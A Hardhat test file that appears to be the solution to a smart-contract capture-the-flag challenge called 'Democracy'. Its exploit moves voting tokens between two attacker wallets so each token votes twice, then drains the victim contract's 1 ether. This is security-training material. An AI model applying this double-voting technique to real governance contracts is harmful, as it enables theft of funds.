const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
  async function setup() {
      const [owner, attackerWallet] = await ethers.getSigners();
      const value = ethers.utils.parseEther("1");

      const VictimFactory = await ethers.getContractFactory(NAME);
      const victimContract = await VictimFactory.deploy({ value });

      return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
      let victimContract, attackerWallet;
      before(async function () {
          ({ victimContract, attackerWallet } = await loadFixture(setup));
      })

      // Use different addresses and transfer for re-voting.
      it("conduct your attack here", async function () {
        //your attack code goes here
          const signers = await ethers.getSigners();
          const attackerWallet2 = signers[2];

          await victimContract.nominateChallenger(attackerWallet.address);

          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 0);
          await victimContract.connect(attackerWallet).vote(attackerWallet.address);

          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 1);
          await victimContract.connect(attackerWallet2).vote(attackerWallet.address);

          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
      });

      after(async function () {
          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
          expect(victimContractBalance).to.be.equal('0');
      });
  });
});
